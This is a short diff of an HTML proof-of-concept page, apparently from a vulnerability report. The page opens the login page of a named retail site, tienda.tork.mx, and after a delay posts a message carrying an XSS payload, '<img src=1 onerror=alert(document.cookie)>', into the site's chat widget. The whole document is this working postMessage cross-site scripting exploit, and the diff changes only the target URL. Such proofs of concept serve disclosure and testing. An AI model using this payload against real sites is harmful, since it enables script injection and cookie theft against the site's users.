@@ -9,7 +9,7 @@
     <button id="test">Click here</button>
     <script>
     function poc() {
-        var w = window.open("https://tienda.tork.mx/login?ReturnUrl=%2f_secure%2faccount")
+        var w = window.open("https://tienda.tork.mx/login")
         setTimeout(function(){w.postMessage({"action":"NEWMESSAGE","message":{"message":"<img src=1 onerror=alert(document.cookie)>", "bot":false}},"*");}, 2000);
     };
     document.getElementById("test").addEventListener("click", poc);
